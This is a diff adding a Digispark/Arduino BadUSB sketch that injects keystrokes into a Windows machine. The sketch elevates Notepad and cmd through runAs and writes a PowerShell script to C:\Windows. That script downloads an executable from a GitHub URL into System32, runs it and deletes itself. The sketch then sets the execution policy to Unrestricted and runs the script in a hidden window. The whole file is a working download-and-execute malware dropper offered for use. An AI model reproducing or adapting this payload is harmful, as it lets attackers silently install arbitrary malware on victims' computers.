@@ -1,0 +1,54 @@
+#include "DigiKeyboard.h"
+void setup(){}
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.sendKeyStroke(21, 8);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("powershell Start-Process notepad -Verb runAs");
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.sendKeyStroke(28, 4);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.sendKeyStroke(44, 4);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("m");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(81);
+  DigiKeyboard.sendKeyStroke(null, null);
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.print("(New-Object Net.Webclient).DownloadFile('https://raw.githubusercontent.com/Georg-prog-cmd/GeorgGit/master/PisosPro.exe',"C:\Windows\System32\73928.exe"); Start-Process -FilePath "C:\Windows\System32\73928.exe"");
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.print("Remove-Item $MyINvocation.InvocationName");
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.sendKeyStroke(22, 1);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("C:\Windows\config-73928.ps1");
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(61, 4);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.sendKeyStroke(21, 8);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.sendKeyStroke(28, 4);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("mode con:cols=14 lines=1");
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.sendKeyStroke(44, 4);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.print("m");
+  DigiKeyboard.delay(750);
+  DigiKeyboard.sendKeyStroke(81);
+  DigiKeyboard.sendKeyStroke(null, null);
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+  DigiKeyboard.sendKeyStroke(40);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.print("powershell.exe -windowstyle hidden -File C:\Windows\config-73928.ps1");
+  DigiKeyboard.sendKeyStroke(40);
+}
